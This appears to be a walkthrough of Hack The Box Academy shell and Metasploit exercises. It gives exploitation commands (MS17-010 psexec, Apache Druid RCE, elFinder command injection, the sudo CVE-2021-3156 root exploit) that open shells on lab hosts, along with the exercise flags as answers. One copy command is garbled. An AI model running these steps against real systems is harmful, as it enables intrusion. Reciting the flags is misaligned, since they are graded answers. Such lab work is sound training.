<p><strong>What language is the shell written in that gets uploaded when using the 50064.rb exploit?</strong></p>
<p>Results:  php</p>
<p><strong>Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-136-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-136-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-136-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-136-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-136-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-136-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-136-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-136-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-136-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-136-10">10</a></span>
<span class="normal"><a href="#__codelineno-136-11">11</a></span>
<span class="normal"><a href="#__codelineno-136-12">12</a></span>
<span class="normal"><a href="#__codelineno-136-13">13</a></span>
<span class="normal"><a href="#__codelineno-136-14">14</a></span>
<span class="normal"><a href="#__codelineno-136-15">15</a></span>
<span class="normal"><a href="#__codelineno-136-16">16</a></span>
<span class="normal"><a href="#__codelineno-136-17">17</a></span>
<span class="normal"><a href="#__codelineno-136-18">18</a></span>
<span class="normal"><a href="#__codelineno-136-19">19</a></span>
<span class="normal"><a href="#__codelineno-136-20">20</a></span>
<span class="normal"><a href="#__codelineno-136-21">21</a></span>
<span class="normal"><a href="#__codelineno-136-22">22</a></span>
<span class="normal"><a href="#__codelineno-136-23">23</a></span>
<span class="normal"><a href="#__codelineno-136-24">24</a></span>
<span class="normal"><a href="#__codelineno-136-25">25</a></span>
<span class="normal"><a href="#__codelineno-136-26">26</a></span>
<span class="normal"><a href="#__codelineno-136-27">27</a></span>
<span class="normal"><a href="#__codelineno-136-28">28</a></span>
<span class="normal"><a href="#__codelineno-136-29">29</a></span>
<span class="normal"><a href="#__codelineno-136-30">30</a></span>
<span class="normal"><a href="#__codelineno-136-31">31</a></span>
<span class="normal"><a href="#__codelineno-136-32">32</a></span>
<span class="normal"><a href="#__codelineno-136-33">33</a></span>
<span class="normal"><a href="#__codelineno-136-34">34</a></span>
<span class="normal"><a href="#__codelineno-136-35">35</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1"></a># Open firefox writting in the terminal
</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2"></a>firefox
</span><span id="__span-136-3"><a id="__codelineno-136-3" name="__codelineno-136-3"></a>
</span><span id="__span-136-4"><a id="__codelineno-136-4" name="__codelineno-136-4"></a># Open the blog in scope http://blog.inlinefreight.local and click on login
</span><span id="__span-136-5"><a id="__codelineno-136-5" name="__codelineno-136-5"></a># Enter the creds from the access-creds.txt file: admin:admin123!@#
</span><span id="__span-136-6"><a id="__codelineno-136-6" name="__codelineno-136-6"></a># The new interface allows you to upload certain contents. Open Burpsuite and intercept communications. Also, observe the content of the site. There is a link to https://www.exploit-db.com/exploits/50064 about Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)
</span><span id="__span-136-7"><a id="__codelineno-136-7" name="__codelineno-136-7"></a># Open a terminal on the Parrot:
</span><span id="__span-136-8"><a id="__codelineno-136-8" name="__codelineno-136-8"></a>searchsploit Lightweight
</span><span id="__span-136-9"><a id="__codelineno-136-9" name="__codelineno-136-9"></a># You will see 
</span><span id="__span-136-10"><a id="__codelineno-136-10" name="__codelineno-136-10"></a>Lightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb
</span><span id="__span-136-11"><a id="__codelineno-136-11" name="__codelineno-136-11"></a>
</span><span id="__span-136-12"><a id="__codelineno-136-12" name="__codelineno-136-12"></a># Print the path
</span><span id="__span-136-13"><a id="__codelineno-136-13" name="__codelineno-136-13"></a>searchsploit -m php/webapps/50064.rb
</span><span id="__span-136-14"><a id="__codelineno-136-14" name="__codelineno-136-14"></a>
</span><span id="__span-136-15"><a id="__codelineno-136-15" name="__codelineno-136-15"></a># Create the folders
</span><span id="__span-136-16"><a id="__codelineno-136-16" name="__codelineno-136-16"></a>sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/
</span><span id="__span-136-17"><a id="__codelineno-136-17" name="__codelineno-136-17"></a>sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/
</span><span id="__span-136-18"><a id="__codelineno-136-18" name="__codelineno-136-18"></a>
</span><span id="__span-136-19"><a id="__codelineno-136-19" name="__codelineno-136-19"></a># Copy the exploit
</span><span id="__span-136-20"><a id="__codelineno-136-20" name="__codelineno-136-20"></a>sudo cp 50064.rb mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/
</span><span id="__span-136-21"><a id="__codelineno-136-21" name="__codelineno-136-21"></a>
</span><span id="__span-136-22"><a id="__codelineno-136-22" name="__codelineno-136-22"></a># Reload all modules
</span><span id="__span-136-23"><a id="__codelineno-136-23" name="__codelineno-136-23"></a>reload_all
</span><span id="__span-136-24"><a id="__codelineno-136-24" name="__codelineno-136-24"></a>
</span><span id="__span-136-25"><a id="__codelineno-136-25" name="__codelineno-136-25"></a># Now when searching for Lightweight, we could access the exploit
</span><span id="__span-136-26"><a id="__codelineno-136-26" name="__codelineno-136-26"></a>search Lightweight
</span><span id="__span-136-27"><a id="__codelineno-136-27" name="__codelineno-136-27"></a>use exploit/php/webapps/50064
</span><span id="__span-136-28"><a id="__codelineno-136-28" name="__codelineno-136-28"></a>options
</span><span id="__span-136-29"><a id="__codelineno-136-29" name="__codelineno-136-29"></a>set RHOSTS 172.16.1.12
</span><span id="__span-136-30"><a id="__codelineno-136-30" name="__codelineno-136-30"></a>set TARGETURI /
</span><span id="__span-136-31"><a id="__codelineno-136-31" name="__codelineno-136-31"></a>set VHOST blog.inlanefreight.local
</span><span id="__span-136-32"><a id="__codelineno-136-32" name="__codelineno-136-32"></a>set USERNAME admin
</span><span id="__span-136-33"><a id="__codelineno-136-33" name="__codelineno-136-33"></a>set PASSWORD admin123!@#
</span><span id="__span-136-34"><a id="__codelineno-136-34" name="__codelineno-136-34"></a>run
</span><span id="__span-136-35"><a id="__codelineno-136-35" name="__codelineno-136-35"></a>cat /customscripts/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  B1nD_Shells_r_cool</p>
<p><strong>What is the hostname of Host-3?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-137-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1"></a>sudo nmap -A 172.16.1.13 -p80,135,139,445
</span></code></pre></div></td></tr></table></div>
<p>Results:  SHELLS-WINBLUE</p>
<p><strong>Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-138-1">1</a></span>
<span class="normal"><a href="#__codelineno-138-2">2</a></span>
<span class="normal"><a href="#__codelineno-138-3">3</a></span>
<span class="normal"><a href="#__codelineno-138-4">4</a></span>
<span class="normal"><a href="#__codelineno-138-5">5</a></span>
<span class="normal"><a href="#__codelineno-138-6">6</a></span>
<span class="normal"><a href="#__codelineno-138-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1"></a>msfconsole -q
</span><span id="__span-138-2"><a id="__codelineno-138-2" name="__codelineno-138-2"></a>use exploit/windows/smb/ms17_010_psexec
</span><span id="__span-138-3"><a id="__codelineno-138-3" name="__codelineno-138-3"></a>SET RHOSTS 172.16.1.13
</span><span id="__span-138-4"><a id="__codelineno-138-4" name="__codelineno-138-4"></a>SET LHOST 172.16.1.5
</span><span id="__span-138-5"><a id="__codelineno-138-5" name="__codelineno-138-5"></a>run 
</span><span id="__span-138-6"><a id="__codelineno-138-6" name="__codelineno-138-6"></a>shell
</span><span id="__span-138-7"><a id="__codelineno-138-7" name="__codelineno-138-7"></a>type C:\Users\Administrator\Desktop\Skills-flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  One-H0st-Down!</p>
<h2 id="using-the-metasploit-framework"><a href="https://academy.hackthebox.com/module/details/39">Using the Metasploit Framework</a></h2>
<h3 id="introduction-to-metasploit">Introduction to Metasploit</h3>
<p><strong>Which version of Metasploit comes equipped with a GUI interface?</strong></p>
<p>Results: Metasploit Pro</p>
<p><strong>What command do you use to interact with the free version of Metasploit?</strong></p>
<p>Results: msfconsole</p>
<h3 id="msf-components">MSF Components</h3>
<p><strong>Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-139-1">1</a></span>
<span class="normal"><a href="#__codelineno-139-2">2</a></span>
<span class="normal"><a href="#__codelineno-139-3">3</a></span>
<span class="normal"><a href="#__codelineno-139-4">4</a></span>
<span class="normal"><a href="#__codelineno-139-5">5</a></span>
<span class="normal"><a href="#__codelineno-139-6">6</a></span>
<span class="normal"><a href="#__codelineno-139-7">7</a></span>
<span class="normal"><a href="#__codelineno-139-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1"></a>msfconsole -q
</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2"></a>
</span><span id="__span-139-3"><a id="__codelineno-139-3" name="__codelineno-139-3"></a>search EternalRomance
</span><span id="__span-139-4"><a id="__codelineno-139-4" name="__codelineno-139-4"></a>use exploit/windows/smb/ms17_010_psexec
</span><span id="__span-139-5"><a id="__codelineno-139-5" name="__codelineno-139-5"></a>
</span><span id="__span-139-6"><a id="__codelineno-139-6" name="__codelineno-139-6"></a>#set options, run, and obtain a meterpreter
</span><span id="__span-139-7"><a id="__codelineno-139-7" name="__codelineno-139-7"></a>shell
</span><span id="__span-139-8"><a id="__codelineno-139-8" name="__codelineno-139-8"></a>type C:/Users/Administrator/Desktop/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{MSF-W1nD0w5-3xPL01t4t10n}</p>
<p><strong>Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-140-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1"></a>sudo nmap -sC -sV $ip -Pn 
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-141-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-141-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-141-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-141-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-141-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-141-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-141-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-141-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-141-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-141-10">10</a></span>
<span class="normal"><a href="#__codelineno-141-11">11</a></span>
<span class="normal"><a href="#__codelineno-141-12">12</a></span>
<span class="normal"><a href="#__codelineno-141-13">13</a></span>
<span class="normal"><a href="#__codelineno-141-14">14</a></span>
<span class="normal"><a href="#__codelineno-141-15">15</a></span>
<span class="normal"><a href="#__codelineno-141-16">16</a></span>
<span class="normal"><a href="#__codelineno-141-17">17</a></span>
<span class="normal"><a href="#__codelineno-141-18">18</a></span>
<span class="normal"><a href="#__codelineno-141-19">19</a></span>
<span class="normal"><a href="#__codelineno-141-20">20</a></span>
<span class="normal"><a href="#__codelineno-141-21">21</a></span>
<span class="normal"><a href="#__codelineno-141-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1"></a># From results you have
</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2"></a>PORT     STATE SERVICE VERSION
</span><span id="__span-141-3"><a id="__codelineno-141-3" name="__codelineno-141-3"></a>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
</span><span id="__span-141-4"><a id="__codelineno-141-4" name="__codelineno-141-4"></a>| ssh-hostkey: 
</span><span id="__span-141-5"><a id="__codelineno-141-5" name="__codelineno-141-5"></a>|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
</span><span id="__span-141-6"><a id="__codelineno-141-6" name="__codelineno-141-6"></a>|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
</span><span id="__span-141-7"><a id="__codelineno-141-7" name="__codelineno-141-7"></a>|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
</span><span id="__span-141-8"><a id="__codelineno-141-8" name="__codelineno-141-8"></a>8081/tcp open  http    Jetty 9.4.12.v20180830
</span><span id="__span-141-9"><a id="__codelineno-141-9" name="__codelineno-141-9"></a>| http-title: Apache Druid
</span><span id="__span-141-10"><a id="__codelineno-141-10" name="__codelineno-141-10"></a>|_Requested resource was http://10.129.203.52:8081/unified-console.html
</span><span id="__span-141-11"><a id="__codelineno-141-11" name="__codelineno-141-11"></a>|_http-server-header: Jetty(9.4.12.v20180830)
</span><span id="__span-141-12"><a id="__codelineno-141-12" name="__codelineno-141-12"></a>8082/tcp open  http    Jetty 9.4.12.v20180830
</span><span id="__span-141-13"><a id="__codelineno-141-13" name="__codelineno-141-13"></a>|_http-title: Site doesn&#39;t have a title.
</span><span id="__span-141-14"><a id="__codelineno-141-14" name="__codelineno-141-14"></a>|_http-server-header: Jetty(9.4.12.v20180830)
</span><span id="__span-141-15"><a id="__codelineno-141-15" name="__codelineno-141-15"></a>8083/tcp open  http    Jetty 9.4.12.v20180830
</span><span id="__span-141-16"><a id="__codelineno-141-16" name="__codelineno-141-16"></a>|_http-server-header: Jetty(9.4.12.v20180830)
</span><span id="__span-141-17"><a id="__codelineno-141-17" name="__codelineno-141-17"></a>|_http-title: Site doesn&#39;t have a title.
</span><span id="__span-141-18"><a id="__codelineno-141-18" name="__codelineno-141-18"></a>8888/tcp open  http    Jetty 9.4.12.v20180830
</span><span id="__span-141-19"><a id="__codelineno-141-19" name="__codelineno-141-19"></a>|_http-server-header: Jetty(9.4.12.v20180830)
</span><span id="__span-141-20"><a id="__codelineno-141-20" name="__codelineno-141-20"></a>| http-title: Apache Druid
</span><span id="__span-141-21"><a id="__codelineno-141-21" name="__codelineno-141-21"></a>|_Requested resource was http://10.129.203.52:8888/unified-console.html
</span><span id="__span-141-22"><a id="__codelineno-141-22" name="__codelineno-141-22"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-142-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-142-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-142-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-142-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-142-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-142-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-142-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-142-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-142-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-142-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1"></a># Now
</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2"></a>msfconsole -q
</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3"></a>search apache druid
</span><span id="__span-142-4"><a id="__codelineno-142-4" name="__codelineno-142-4"></a>use linux/http/apache_druid_js_rce
</span><span id="__span-142-5"><a id="__codelineno-142-5" name="__codelineno-142-5"></a># set RHOSTS, LHOST, etc and run it to obtain a meterpreter
</span><span id="__span-142-6"><a id="__codelineno-142-6" name="__codelineno-142-6"></a>
</span><span id="__span-142-7"><a id="__codelineno-142-7" name="__codelineno-142-7"></a>shell
</span><span id="__span-142-8"><a id="__codelineno-142-8" name="__codelineno-142-8"></a>pwd
</span><span id="__span-142-9"><a id="__codelineno-142-9" name="__codelineno-142-9"></a>cd ..
</span><span id="__span-142-10"><a id="__codelineno-142-10" name="__codelineno-142-10"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{MSF_Expl01t4t10n}</p>
<h3 id="msf-sessions">MSF Sessions</h3>
<p><strong>The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?</strong></p>
<p>Results: elFinder</p>
<p><strong>Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-143-1">1</a></span>
<span class="normal"><a href="#__codelineno-143-2">2</a></span>
<span class="normal"><a href="#__codelineno-143-3">3</a></span>
<span class="normal"><a href="#__codelineno-143-4">4</a></span>
<span class="normal"><a href="#__codelineno-143-5">5</a></span>
<span class="normal"><a href="#__codelineno-143-6">6</a></span>
<span class="normal"><a href="#__codelineno-143-7">7</a></span>
<span class="normal"><a href="#__codelineno-143-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1"></a>msfconsole -q
</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2"></a>workspace -a lala
</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3"></a>db_nmap -sC -sV $ip
</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4"></a>search elfinder
</span><span id="__span-143-5"><a id="__codelineno-143-5" name="__codelineno-143-5"></a>use linux/http/elfinder_archive_cmd_injection
</span><span id="__span-143-6"><a id="__codelineno-143-6" name="__codelineno-143-6"></a># SET RHOSTS, SET LHOST...
</span><span id="__span-143-7"><a id="__codelineno-143-7" name="__codelineno-143-7"></a>run
</span><span id="__span-143-8"><a id="__codelineno-143-8" name="__codelineno-143-8"></a>getuid
</span></code></pre></div></td></tr></table></div>
<p>Results: www-data</p>
<p><strong>The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-144-1">1</a></span>
<span class="normal"><a href="#__codelineno-144-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1"></a># In the previous session, run
</span><span id="__span-144-2"><a id="__codelineno-144-2" name="__codelineno-144-2"></a>sudo -V
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-145-1">1</a></span>
<span class="normal"><a href="#__codelineno-145-2">2</a></span>
<span class="normal"><a href="#__codelineno-145-3">3</a></span>
<span class="normal"><a href="#__codelineno-145-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1"></a>Sudo version 1.8.31
</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2"></a>Sudoers policy plugin version 1.8.31
</span><span id="__span-145-3"><a id="__codelineno-145-3" name="__codelineno-145-3"></a>Sudoers file grammar version 46
</span><span id="__span-145-4"><a id="__codelineno-145-4" name="__codelineno-145-4"></a>Sudoers I/O plugin version 1.8.31
</span></code></pre></div></td></tr></table></div>
<p>After searching in google, we find CVE-2021-3156:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-146-1">1</a></span>
<span class="normal"><a href="#__codelineno-146-2">2</a></span>
<span class="normal"><a href="#__codelineno-146-3">3</a></span>
<span class="normal"><a href="#__codelineno-146-4">4</a></span>
<span class="normal"><a href="#__codelineno-146-5">5</a></span>
<span class="normal"><a href="#__codelineno-146-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1"></a>search CVE-2021-3156
</span><span id="__span-146-2"><a id="__codelineno-146-2" name="__codelineno-146-2"></a>options
</span><span id="__span-146-3"><a id="__codelineno-146-3" name="__codelineno-146-3"></a># SET SESSION 2, SET LHOST, SET RHOSTS
</span><span id="__span-146-4"><a id="__codelineno-146-4" name="__codelineno-146-4"></a>run
</span><span id="__span-146-5"><a id="__codelineno-146-5" name="__codelineno-146-5"></a>shell
</span><span id="__span-146-6"><a id="__codelineno-146-6" name="__codelineno-146-6"></a>cat /root/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{5e55ion5_4r3_sw33t}</p>
<p>Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-147-1">1</a></span>
<span class="normal"><a href="#__codelineno-147-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1"></a>msfconsole -q
</span><span id="__span-147-2"><a id="__codelineno-147-2" name="__codelineno-147-2"></a>db_nmap -sC -sV -p- $ip
</span></code></pre></div></td></tr></table></div>
<p>From response pay attention to port 5000:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-148-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-148-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-148-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-148-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-148-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-148-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-148-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-148-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-148-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-148-10">10</a></span>
<span class="normal"><a href="#__codelineno-148-11">11</a></span>
<span class="normal"><a href="#__codelineno-148-12">12</a></span>
<span class="normal"><a href="#__codelineno-148-13">13</a></span>
<span class="normal"><a href="#__codelineno-148-14">14</a></span>
<span class="normal"><a href="#__codelineno-148-15">15</a></span>
<span class="normal"><a href="#__codelineno-148-16">16</a></span>
<span class="normal"><a href="#__codelineno-148-17">17</a></span>
<span class="normal"><a href="#__codelineno-148-18">18</a></span>
<span class="normal"><a href="#__codelineno-148-19">19</a></span>
<span class="normal"><a href="#__codelineno-148-20">20</a></span>
<span class="normal"><a href="#__codelineno-148-21">21</a></span>
<span class="normal"><a href="#__codelineno-148-22">22</a></span>
<span class="normal"><a href="#__codelineno-148-23">23</a></span>
<span class="normal"><a href="#__codelineno-148-24">24</a></span>
<span class="normal"><a href="#__codelineno-148-25">25</a></span>
<span class="normal"><a href="#__codelineno-148-26">26</a></span>
<span class="normal"><a href="#__codelineno-148-27">27</a></span>
<span class="normal"><a href="#__codelineno-148-28">28</a></span>
<span class="normal"><a href="#__codelineno-148-29">29</a></span>
<span class="normal"><a href="#__codelineno-148-30">30</a></span>
<span class="normal"><a href="#__codelineno-148-31">31</a></span>
<span class="normal"><a href="#__codelineno-148-32">32</a></span>
<span class="normal"><a href="#__codelineno-148-33">33</a></span>
<span class="normal"><a href="#__codelineno-148-34">34</a></span>
<span class="normal"><a href="#__codelineno-148-35">35</a></span>
<span class="normal"><a href="#__codelineno-148-36">36</a></span>
<span class="normal"><a href="#__codelineno-148-37">37</a></span>
<span class="normal"><a href="#__codelineno-148-38">38</a></span>
<span class="normal"><a href="#__codelineno-148-39">39</a></span>
<span class="normal"><a href="#__codelineno-148-40">40</a></span>
<span class="normal"><a href="#__codelineno-148-41">41</a></span>
<span class="normal"><a href="#__codelineno-148-42">42</a></span>
<span class="normal"><a href="#__codelineno-148-43">43</a></span>
<span class="normal"><a href="#__codelineno-148-44">44</a></span>
<span class="normal"><a href="#__codelineno-148-45">45</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1"></a>Nmap: PORT      STATE SERVICE       VERSION
</span><span id="__span-148-2"><a id="__codelineno-148-2" name="__codelineno-148-2"></a>[*] Nmap: 135/tcp   open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-3"><a id="__codelineno-148-3" name="__codelineno-148-3"></a>[*] Nmap: 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span><span id="__span-148-4"><a id="__codelineno-148-4" name="__codelineno-148-4"></a>[*] Nmap: 445/tcp   open  microsoft-ds?
</span><span id="__span-148-5"><a id="__codelineno-148-5" name="__codelineno-148-5"></a>[*] Nmap: 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
</span><span id="__span-148-6"><a id="__codelineno-148-6" name="__codelineno-148-6"></a>[*] Nmap: |_ssl-date: 2024-09-23T19:38:10+00:00; 0s from scanner time.
</span><span id="__span-148-7"><a id="__codelineno-148-7" name="__codelineno-148-7"></a>[*] Nmap: | ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
</span><span id="__span-148-8"><a id="__codelineno-148-8" name="__codelineno-148-8"></a>[*] Nmap: | Not valid before: 2024-09-22T19:35:32
</span><span id="__span-148-9"><a id="__codelineno-148-9" name="__codelineno-148-9"></a>[*] Nmap: |_Not valid after:  2025-03-24T19:35:32
</span><span id="__span-148-10"><a id="__codelineno-148-10" name="__codelineno-148-10"></a>[*] Nmap: | rdp-ntlm-info:
</span><span id="__span-148-11"><a id="__codelineno-148-11" name="__codelineno-148-11"></a>[*] Nmap: |   Target_Name: WIN-51BJ97BCIPV
</span><span id="__span-148-12"><a id="__codelineno-148-12" name="__codelineno-148-12"></a>[*] Nmap: |   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
</span><span id="__span-148-13"><a id="__codelineno-148-13" name="__codelineno-148-13"></a>[*] Nmap: |   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
</span><span id="__span-148-14"><a id="__codelineno-148-14" name="__codelineno-148-14"></a>[*] Nmap: |   DNS_Domain_Name: WIN-51BJ97BCIPV
</span><span id="__span-148-15"><a id="__codelineno-148-15" name="__codelineno-148-15"></a>[*] Nmap: |   DNS_Computer_Name: WIN-51BJ97BCIPV
</span><span id="__span-148-16"><a id="__codelineno-148-16" name="__codelineno-148-16"></a>[*] Nmap: |   Product_Version: 10.0.17763
</span><span id="__span-148-17"><a id="__codelineno-148-17" name="__codelineno-148-17"></a>[*] Nmap: |_  System_Time: 2024-09-23T19:38:02+00:00
</span><span id="__span-148-18"><a id="__codelineno-148-18" name="__codelineno-148-18"></a>[*] Nmap: 5000/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span><span id="__span-148-19"><a id="__codelineno-148-19" name="__codelineno-148-19"></a>[*] Nmap: | http-methods:
</span><span id="__span-148-20"><a id="__codelineno-148-20" name="__codelineno-148-20"></a>[*] Nmap: |_  Potentially risky methods: TRACE
</span><span id="__span-148-21"><a id="__codelineno-148-21" name="__codelineno-148-21"></a>[*] Nmap: |_http-server-header: Microsoft-IIS/10.0
</span><span id="__span-148-22"><a id="__codelineno-148-22" name="__codelineno-148-22"></a>[*] Nmap: |_http-title: FortiLogger | Log and Report System
</span><span id="__span-148-23"><a id="__codelineno-148-23" name="__codelineno-148-23"></a>[*] Nmap: 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span><span id="__span-148-24"><a id="__codelineno-148-24" name="__codelineno-148-24"></a>[*] Nmap: |_http-title: Not Found
</span><span id="__span-148-25"><a id="__codelineno-148-25" name="__codelineno-148-25"></a>[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
</span><span id="__span-148-26"><a id="__codelineno-148-26" name="__codelineno-148-26"></a>[*] Nmap: 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span><span id="__span-148-27"><a id="__codelineno-148-27" name="__codelineno-148-27"></a>[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
</span><span id="__span-148-28"><a id="__codelineno-148-28" name="__codelineno-148-28"></a>[*] Nmap: |_http-title: Not Found
</span><span id="__span-148-29"><a id="__codelineno-148-29" name="__codelineno-148-29"></a>[*] Nmap: 49664/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-30"><a id="__codelineno-148-30" name="__codelineno-148-30"></a>[*] Nmap: 49665/tcp open  msrpc         Microsoft Windows RPC
